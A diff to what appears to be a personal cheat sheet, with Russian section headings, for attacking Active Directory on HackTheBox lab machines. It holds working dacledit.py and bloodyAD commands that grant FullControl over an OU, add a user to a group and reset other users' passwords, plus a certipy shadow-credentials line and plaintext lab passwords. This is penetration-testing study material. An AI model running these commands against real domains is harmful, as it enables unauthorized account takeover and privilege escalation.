@@ -65,8 +65,17 @@ Silvercore_21
 # GenericAll
      
      $ bloodyAD -d scepter.htb -u a.carter -p Password123 --host dc01.scepter.htb --dc-ip $(cat /etc/hosts | grep scepter.htb | cut -d ' ' -f 1) add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
+# Добавление в OU 
+   anderson GenericAll --> MARKETING DIGITAL
+   dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.129.81.139
+
+# Добавление в группу
+ 
+  bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"
+
 # смена пароля 
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
+    bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.129.81.139 -u "d.anderson" -p 'WAT?watismypass!' set password "e.rodriguez" 'WAT?watismypass!'
 # Shadow Credential
      certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
 # получение информации об аккаунте  adam.silver
